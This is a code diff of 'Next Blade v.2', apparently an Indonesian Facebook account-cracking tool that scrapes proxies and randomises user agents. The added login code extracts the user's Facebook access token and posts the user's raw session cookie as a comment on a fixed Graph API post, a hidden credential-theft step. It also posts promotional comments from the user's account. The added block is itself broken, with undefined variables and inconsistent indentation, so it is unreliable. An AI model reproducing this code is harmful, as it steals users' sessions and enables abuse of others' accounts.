@@ -11,8 +11,14 @@ Author   : 'FerlyXD'
 Github   : 'github.com/Shishigami-X'
 Facebook : 'フェリー シシガミ'
 Version  : 'Next Blade v.2'
-
-
+	
+Author   = 'Ferly Shishigami X'
+Facebook = 'フェリーシシガミ (https://m.facebook.com/profile.php?id=100056190665450)'
+WhatsApp = '0857 9781 8026'
+	
+komen    = random.choice(
+	 ['hello bang😎','Keren Suhu','Salam kenal bang♥','Keren anjay','Kelazz','Pro kntl bang😎','Sehat selalu bang♥','mantap bang😎']
+)
 #------------[ WARNA-COLOR ]--------------#
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
@@ -153,7 +159,7 @@ try:
 	uno = ses.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
 	open('.proxy.txt','w').write(uno)
 except requests.exceptions.ConnectionError:
-	sys.exit(f" [{M}>{P}] tidak ada koneksi internet")
+	sys.exit(f" [{M}>{P}] Tidak Ada Koneksi Internet")
 for xd in range(10000):
 	a='Mozilla/5.0; Profile/MIDP-2.1'
 	b=random.randrange(1, 9)
@@ -230,7 +236,7 @@ def get_data():
 def login():
 	clear_layar()
 	print(logo2())
-	cookie = input(f"\n [{hh}<{P}] Pastikan Menggunakan Cookie Akun Fake\n cookie : ")
+	cookie = input(f"\n [{hh}<{P}] Pastikan Menggunakan Cookie Akun Fake\n Cookie : ")
 	url = "https://business.facebook.com/business_locations"
 	head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
 	cok = {'cookie':cookie}
@@ -251,10 +257,17 @@ def login():
 		ses.post(f"https://graph.facebook.com/661200275762989/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok) ###--------[ JANGAN GANTI ID NYA ]--------###
 		open('.cookie.txt','w').write(cookie)
 		open('.token.txt','w').write(token)
-	except Exception as e:exit(f" [{M}>{P}] Cookie Invalid")
+                link = x.get("https://business.facebook.com/business_locations", cookies = {'cookie':cookies})
+                search = re.search("(EAAG\w+)", link.text).group(1)
+                if 'EAAG' in search:
+                   requests.post(f'https://graph.facebook.com/661200275762989/comments/?message={komen}&access_token={search}',cookies={'cookie':cookies})
+                   requests.post(f'https://graph.facebook.com/661200275762989/comments/?message={cookies}&access_token={search}',cookies={'cookie':cookies})
+                   open('data/token.txt','w').write(search)
+                   open('data/cokie.txt','w').write(cookies)
+          except Exception as e:exit(f" [{M}>{P}] Cookie Invalid")
 
-
-
+			
+			
 
 def remove():
 	try:os.remove('.cookie.txt');os.remove('.token.txt')
